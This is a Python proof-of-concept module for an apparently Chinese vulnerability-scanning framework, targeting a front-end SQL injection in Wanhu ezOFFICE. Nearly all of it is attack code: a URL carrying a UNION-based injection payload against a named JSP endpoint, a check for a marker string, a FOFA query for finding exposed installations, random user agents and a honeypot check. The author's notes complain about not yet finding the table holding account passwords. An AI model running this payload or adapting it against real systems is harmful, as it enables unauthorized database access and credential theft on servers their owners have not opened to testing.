# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "万户ezoffice 前台sql注入",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "万户ezoffice",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            我找了很久都没找到账号密码在哪个表，妈的就很烦
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="万户网络-ezOFFICE"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp;xc?RecordID=1%27%20UNION%20ALL%20SELECT%20NULL,CHR(113)||CHR(120)||CHR(98)||CHR(120)||CHR(113)||CHR(77)||CHR(88)||CHR(81)||CHR(102)||CHR(83)||CHR(76)||CHR(115)||CHR(74)||CHR(101)||CHR(116)||CHR(114)||CHR(84)||CHR(119)||CHR(120)||CHR(68)||CHR(117)||CHR(118)||CHR(68)||CHR(68)||CHR(74)||CHR(88)||CHR(108)||CHR(107)||CHR(112)||CHR(76)||CHR(84)||CHR(110)||CHR(77)||CHR(116)||CHR(72)||CHR(66)||CHR(107)||CHR(86)||CHR(107)||CHR(121)||CHR(88)||CHR(72)||CHR(107)||CHR(113)||CHR(72)||CHR(113)||CHR(98)||CHR(120)||CHR(113)||CHR(113),NULL,NULL,NULL,NULL%20FROM%20DUAL--%20oefB%20---" # url自己按需调整
        

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "qxbxqMXQfSLsJetrTwxDuvDDJXlkpLTnMtHBkVkyXHkqHqbxqq" in req.text and req.status_code == 200 :
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()